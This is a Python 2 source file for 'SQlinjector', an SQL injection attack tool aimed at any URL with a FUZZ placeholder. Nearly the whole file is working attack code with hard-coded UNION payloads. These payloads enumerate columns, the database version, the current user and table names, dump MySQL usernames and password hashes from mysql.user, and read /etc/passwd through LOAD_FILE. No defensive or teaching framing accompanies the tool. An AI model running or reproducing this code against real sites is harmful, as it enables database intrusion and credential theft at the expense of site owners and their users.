import requests
import sys
import getopt
import re
from termcolor import colored


def banner():
	print "\n***************************************"
	print "* SQlinjector  1.0                      *"
	print "***************************************"

def usage():
	print "Usage:"
	print "		-w: url (http://somesite.com/news.php?id=FUZZ)\n"
  	print "     -i: injection strings file \n"
	print "example: SQLinjector.py -w http://www.somesite.com/news.php?id=FUZZ \n"


def start(argv):
  	banner()
	if len(sys.argv) < 2:
  	   usage()
  	   sys.exit()
	try:
		opts, args = getopt.getopt(argv,"w:i:")
	except getopt.GetoptError:
		print "Error en arguments"
		sys.exit()
	for opt,arg in opts :
		if opt == '-w' :
			url=arg
		elif opt == '-i':
			dictio = arg
	try:
		print "[-] Opening injections file: " + dictio
		f = open(dictio, "r")
		name = f.read().splitlines()
	except:
		print"Failed opening file: "+ dictio+"\n"
		sys.exit()
	launcher(url,name)

def launcher (url,dictio):
	injected = []

	for x in dictio:
		sqlinjection=x
		injected.append(url.replace("FUZZ",sqlinjection))
	res = injector(injected)

	print colored('[+] Detection results:','green')
	print "------------------"
	for x in res:
		print x.split(";")[0]

	print colored ('[+] Detect columns: ','green')
	print "-----------------"
	res = detect_columns(url)
	print "Number of columns: " + res
	res = detect_columns_names(url)

	print "[+] Columns names found: "
	print "-------------------------"
	for col in res:
		print col

	print colored('[+] DB version: ','green')
	print "---------------"
	detect_version(url)

	print colored('[+] Current USER: ','green')
	print "---------------"
	detect_user(url)


	print colored('[+] Get tables names:','green')
	print "---------------------"
	detect_table_names(url)

	print colored('[+] Attempting MYSQL user extraction','green')
	print "-------------------------------------"
	steal_users(url)

	filename="/etc/passwd"
	message = "\n[+] Reading file: " + filename
	print colored(message,'green')
	print "---------------------------------"
	read_file(url,filename)

def injector(injected):
	errors = ['Mysql','error in your SQL']
	results = []
	for y in injected:
		print "[-] Testing errors: " + y
		req=requests.get(y)
		for x in errors:
			if req.content.find(x) != -1:
					res = y + ";" + x
					results.append(res)
	return results

def detect_columns(url):
	new_url= url.replace("FUZZ","admin' order by X-- -")
	y=1
	while y < 20:
		req=requests.get(new_url.replace("X",str(y)))
		if req.content.find("Unknown") == -1:
			y+=1
		else:
			break
	return str(y-1)

def detect_version(url):
	new_url= url.replace("FUZZ","\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
	req=requests.get(new_url)
	raw = req.content
	reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
	version=re.findall(reg,req.content)
	for ver in version:
		print ver
	return ver

def detect_user(url):
	new_url= url.replace("FUZZ","\'%20union%20SELECT%201,CONCAT('TOK',user(),'TOK')--%20-")
	req=requests.get(new_url)
	raw = req.content
	reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
	users=re.findall(reg,req.content)
	for user in users:
		print user
	return user

def steal_users(url):
	new_url= url.replace("FUZZ","1\'%20union%20SELECT%20CONCAT('TOK',user,'TOK'),CONCAT('TOK',password,'TOK')%20FROM%20mysql.user--%20-")
	req=requests.get(new_url)
	reg = ur"TOK([\*a-zA-Z0-9].+?)TOK+?"
	users=re.findall(reg,req.content)
	for user in users:
		print user

def read_file(url, filename):
	new_url= url.replace("FUZZ","""A\'%20union%20SELECT%201,CONCAT('TOK',
	LOAD_FILE(\'"+filename+"\'),'TOK')--%20-""")
	req=requests.get(new_url)
	reg = ur"TOK(.+?)TOK+?"
	files= re.findall(reg,req.content)
	print req.content
	for x in files:
		if not x.find('TOK,'):
			print x

def detect_table_names(url):
	new_url= url.replace("FUZZ","\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20!=%20%27performance_schema%27%20--%20-")
	req=requests.get(new_url)
	raw = req.content
	reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
	tables=re.findall(reg,req.content)
	for table in tables:
		print table


def detect_columns_names(url):
	column_names = ['username','user','name','pass','passwd','password','id','role','surname','address']
	new_url= url.replace("FUZZ","admin' group by X-- -")
	valid_cols = []
	for name in column_names:
		req=requests.get(new_url.replace("X",name))
		if req.content.find("Unknown") == -1:
			valid_cols.append(name)
		else:
			pass
	return valid_cols

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print "SQLinjector interrupted by user..!!"
